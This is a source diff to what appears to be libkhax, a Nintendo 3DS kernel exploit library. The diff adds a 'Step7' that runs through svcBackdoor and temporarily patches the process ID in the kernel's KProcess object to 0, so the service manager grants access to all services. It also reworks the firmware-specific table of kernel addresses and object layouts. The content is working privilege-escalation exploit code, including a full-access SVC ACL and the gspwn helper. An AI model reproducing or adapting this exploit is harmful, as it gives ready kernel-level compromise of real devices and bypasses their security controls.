@@ -35,11 +35,21 @@ namespace KHAX
 		// Physical size of FCRAM on this machine
 		u32 m_fcramSize;
 		// Address of KThread address in kernel (KThread **)
-		static constexpr const u32 m_currentKThreadPtr = 0xFFFF9000;
+		static constexpr KThread **const m_currentKThreadPtr = reinterpret_cast<KThread **>(0xFFFF9000);
 		// Address of KProcess address in kernel (KProcess **)
-		static constexpr const u32 m_currentKProcessPtr = 0xFFFF9004;
-		// Function taking a KProcess * (as void *) and returning SVC access control array
-		KSVCACL &(*m_svcAccessControlConvert)(void *kprocess);
+		static constexpr void **const m_currentKProcessPtr = reinterpret_cast<void **>(0xFFFF9004);
+		// Pseudo-handle of the current KProcess.
+		static constexpr const Handle m_currentKProcessHandle = 0xFFFF8001;
+		// Returned pointers within a KProcess object.  This abstracts out which particular
+		// version of the KProcess object is in use.
+		struct KProcessPointers
+		{
+			KSVCACL *m_svcAccessControl;
+			u32 *m_kernelFlags;
+			u32 *m_processID;
+		};
+		// Creates a KProcessPointers for this kernel version and pointer to the object.
+		KProcessPointers(*m_makeKProcessPointers)(void *kprocess);
 
 		// Convert a user-mode virtual address in the linear heap into a kernel-mode virtual
 		// address using the version-specific information in this table entry.
@@ -49,6 +59,10 @@ namespace KHAX
 		static const VersionData *GetForCurrentSystem();
 
 	private:
+		// Implementation behind m_makeKProcessPointers.
+		template <typename KProcessType>
+		static KProcessPointers MakeKProcessPointers(void *kprocess);
+
 		// Table of these.
 		static const VersionData s_versionTable[];
 	};
@@ -89,6 +103,8 @@ namespace KHAX
 		Result Step5_CorruptCreateThread();
 		// Execute svcCreateThread to execute code at SVC privilege.
 		Result Step6_ExecuteSVCCode();
+		// Grant access to all services.
+		Result Step7_GrantServiceAccess();
 
 	private:
 		// SVC-mode entry point thunk (true entry point).
@@ -103,6 +119,10 @@ namespace KHAX
 		Result Step6e_GrantSVCAccess();
 		// Flush instruction and data caches.
 		Result Step6f_FlushCaches();
+		// Patch the process ID to 0.  Runs as svcBackdoor.
+		static Result Step7a_PatchPID();
+		// Restore the original PID.  Runs as svcBackdoor.
+		static Result Step7b_UnpatchPID();
 
 		// Helper for dumping memory to SD card.
 		template <std::size_t S>
@@ -161,6 +181,9 @@ namespace KHAX
 		// Copy of the old ACL
 		KSVCACL m_oldACL;
 
+		// Original process ID.
+		u32 m_originalPID;
+
 		// Buffers for dumped data when debugging.
 	#ifdef KHAX_DEBUG_DUMP_DATA
 		unsigned char m_savedKProcess[sizeof(KProcess_8_0_0_New)];
@@ -180,9 +203,6 @@ namespace KHAX
 	Result IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown = 0);
 	// gspwn, meant for reading from or writing to freed buffers.
 	Result GSPwn(void *dest, const void *src, std::size_t size, bool wait = true);
-	// Converts a structure pointer to a reference to the given member.
-	template <typename T, typename M, M T::*MP>
-	M &StructMemberThunk(void *object);
 	// Given a pointer to a structure that is a member of another structure,
 	// return a pointer to the outer structure.  Inspired by Windows macro.
 	template <typename Outer, typename Inner>
@@ -196,29 +216,41 @@ namespace KHAX
 //
 
 //------------------------------------------------------------------------------------------------
+// Creates a KProcessPointers for this kernel version and pointer to the object.
+template <typename KProcessType>
+KHAX::VersionData::KProcessPointers KHAX::VersionData::MakeKProcessPointers(void *kprocess)
+{
+	KProcessType *kproc = static_cast<KProcessType *>(kprocess);
+
+	KProcessPointers result;
+	result.m_svcAccessControl = &kproc->m_svcAccessControl;
+	result.m_processID = &kproc->m_processID;
+	result.m_kernelFlags = &kproc->m_kernelFlags;
+	return result;
+}
+
+//------------------------------------------------------------------------------------------------
 // System version table
 const KHAX::VersionData KHAX::VersionData::s_versionTable[] =
 {
-#define SVC_FUNC(ver) StructMemberThunk<KProcess_##ver, \
-	decltype(static_cast<KProcess_##ver *>(nullptr)->m_svcAccessControl), \
-	&KProcess_##ver::m_svcAccessControl>
+#define KPROC_FUNC(ver) MakeKProcessPointers<KProcess_##ver>
 
 	// Old 3DS, old address layout
-	{ false, SYSTEM_VERSION(2, 34, 0), SYSTEM_VERSION(4, 1, 0), 0xEFF83C9F, 0xEFF827CC, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 35, 6), SYSTEM_VERSION(5, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 36, 0), SYSTEM_VERSION(5, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 37, 0), SYSTEM_VERSION(6, 0, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 38, 0), SYSTEM_VERSION(6, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 39, 4), SYSTEM_VERSION(7, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 40, 0), SYSTEM_VERSION(7, 2, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, SVC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 34, 0), SYSTEM_VERSION(4, 1, 0), 0xEFF83C9F, 0xEFF827CC, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 35, 6), SYSTEM_VERSION(5, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 36, 0), SYSTEM_VERSION(5, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 37, 0), SYSTEM_VERSION(6, 0, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 38, 0), SYSTEM_VERSION(6, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 39, 4), SYSTEM_VERSION(7, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 40, 0), SYSTEM_VERSION(7, 2, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
 	// Old 3DS, new address layout
-	{ false, SYSTEM_VERSION(2, 44, 6), SYSTEM_VERSION(8, 0, 0), 0xDFF8376F, 0xDFF82294, 0xE0000000, 0x08000000, SVC_FUNC(8_0_0_Old) },
-	{ false, SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF8383F, 0xDFF82290, 0xE0000000, 0x08000000, SVC_FUNC(8_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 44, 6), SYSTEM_VERSION(8, 0, 0), 0xDFF8376F, 0xDFF82294, 0xE0000000, 0x08000000, KPROC_FUNC(8_0_0_Old) },
+	{ false, SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF8383F, 0xDFF82290, 0xE0000000, 0x08000000, KPROC_FUNC(8_0_0_Old) },
 	// New 3DS
-	{ true,  SYSTEM_VERSION(2, 45, 5), SYSTEM_VERSION(8, 1, 0), 0xDFF83757, 0xDFF82264, 0xE0000000, 0x10000000, SVC_FUNC(8_0_0_New) }, // untested
-	{ true,  SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF83837, 0xDFF82260, 0xE0000000, 0x10000000, SVC_FUNC(8_0_0_New) },
+	{ true,  SYSTEM_VERSION(2, 45, 5), SYSTEM_VERSION(8, 1, 0), 0xDFF83757, 0xDFF82264, 0xE0000000, 0x10000000, KPROC_FUNC(8_0_0_New) }, // untested
+	{ true,  SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF83837, 0xDFF82260, 0xE0000000, 0x10000000, KPROC_FUNC(8_0_0_New) },
 
-#undef SVC_FUNC
+#undef KPROC_FUNC
 };
 
 //------------------------------------------------------------------------------------------------
@@ -699,12 +731,12 @@ Result KHAX::MemChunkHax::Step6e_GrantSVCAccess()
 	static constexpr const char s_fullAccessACL[] = "\xFE\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x3F";
 
 	// Get the KThread pointer.  Its type doesn't vary, so far.
-	KThread *kthread = *reinterpret_cast<KThread **>(m_versionData->m_currentKThreadPtr);
+	KThread *kthread = *m_versionData->m_currentKThreadPtr;
 
 	// Debug dumping.
 #ifdef KHAX_DEBUG_DUMP_DATA
 	// Get the KProcess pointer, whose type varies by kernel version.
-	void *kprocess = *reinterpret_cast<void **>(m_versionData->m_currentKProcessPtr);
+	void *kprocess = *m_versionData->m_currentKProcessPtr;
 
 	void *svcData = reinterpret_cast<void *>(reinterpret_cast<std::uintptr_t>(kthread->m_svcRegisterState) & ~std::uintptr_t(0xFF));
 	std::memcpy(m_savedKProcess, kprocess, sizeof(m_savedKProcess));
@@ -739,6 +771,94 @@ Result KHAX::MemChunkHax::Step6f_FlushCaches()
 		"mov r0, #0\n\t"
 		"mcr p15, 0, r0, c7, c10, 0\n\t");
 
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Grant access to all services.
+Result KHAX::MemChunkHax::Step7_GrantServiceAccess()
+{
+	// Backup the original PID.
+	Result result = svcGetProcessId(&m_originalPID, m_versionData->m_currentKProcessHandle);
+	if (result != 0)
+	{
+		KHAX_printf("Step7:GetPID1 fail:%08lx\n", result);
+		return result;
+	}
+
+	KHAX_printf("Step7:current pid=%lu\n", m_originalPID);
+
+	// Patch the PID to 0, granting access to all services.
+	svcBackdoor(Step7a_PatchPID);
+
+	// Check whether PID patching succeeded.
+	u32 newPID;
+	result = svcGetProcessId(&newPID, m_versionData->m_currentKProcessHandle);
+	if (result != 0)
+	{
+		// Attempt patching back anyway, for stability reasons.
+		svcBackdoor(Step7b_UnpatchPID);
+		KHAX_printf("Step7:GetPID2 fail:%08lx\n", result);
+		return result;
+	}
+
+	if (newPID != 0)
+	{
+		KHAX_printf("Step7:nonzero:%lu\n", newPID);
+		return MakeError(27, 11, KHAX_MODULE, 1023);
+	}
+
+	// Reinit ctrulib's srv connection to gain access to all services.
+	srvExit();
+	srvInit();
+
+	// Restore the original PID now that srv has been tricked into thinking that we're PID 0.
+	svcBackdoor(Step7b_UnpatchPID);
+
+	// Check whether PID restoring succeeded.
+	result = svcGetProcessId(&newPID, m_versionData->m_currentKProcessHandle);
+	if (result != 0)
+	{
+		KHAX_printf("Step7:GetPID3 fail:%08lx\n", result);
+		return result;
+	}
+
+	if (newPID != m_originalPID)
+	{
+		KHAX_printf("Step7:not same:%lu\n", newPID);
+		return MakeError(27, 11, KHAX_MODULE, 1023);
+	}
+
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Patch the PID to 0.
+Result KHAX::MemChunkHax::Step7a_PatchPID()
+{
+	// Disable interrupts ASAP.
+	// FIXME: Need a better solution for this.
+	__asm__ volatile("cpsid aif");
+
+	// Patch the PID to 0.  The version data has a function pointer in m_makeKProcessPointers
+	// to translate the raw KProcess pointer into pointers into key fields, and we access the
+	// m_processID field from it.
+	*(s_instance->m_versionData->m_makeKProcessPointers(*s_instance->m_versionData->m_currentKProcessPtr)
+		.m_processID) = 0;
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Restore the original PID.
+Result KHAX::MemChunkHax::Step7b_UnpatchPID()
+{
+	// Disable interrupts ASAP.
+	// FIXME: Need a better solution for this.
+	__asm__ volatile("cpsid aif");
+
+	// Patch the PID back to the original value.
+	*(s_instance->m_versionData->m_makeKProcessPointers(*s_instance->m_versionData->m_currentKProcessPtr)
+		.m_processID) = s_instance->m_originalPID;
 	return 0;
 }
 
@@ -903,14 +1023,6 @@ Result KHAX::GSPwn(void *dest, const void *src, std::size_t size, bool wait)
 }
 
 //------------------------------------------------------------------------------------------------
-// Converts a structure pointer to a reference to the given member.
-template <typename T, typename M, M T::*MP>
-M &KHAX::StructMemberThunk(void *object)
-{
-	return (static_cast<T *>(object))->*MP;
-}
-
-//------------------------------------------------------------------------------------------------
 // Given a pointer to a structure that is a member of another structure,
 // return a pointer to the outer structure.  Inspired by Windows macro.
 template <typename Outer, typename Inner>
@@ -979,7 +1091,20 @@ extern "C" Result khaxInit()
 		KHAX_printf("khaxInit: Step6 failed: %08lx\n", result);
 		return result;
 	}
+	if (Result result = hax.Step7_GrantServiceAccess())
+	{
+		KHAX_printf("khaxInit: Step7 failed: %08lx\n", result);
+		return result;
+	}
 
-	KHAX_printf("khaxInit: end of implementation\n");
-	return 0; // MakeError(27, 6, KHAX_MODULE, 1012);
+	KHAX_printf("khaxInit: done\n");
+	return 0;
+}
+
+//------------------------------------------------------------------------------------------------
+// Shut down libkhax.  Doesn't actually do anything at the moment, since khaxInit does everything
+// and frees all memory on the way out.
+extern "C" Result khaxExit()
+{
+	return 0;
 }
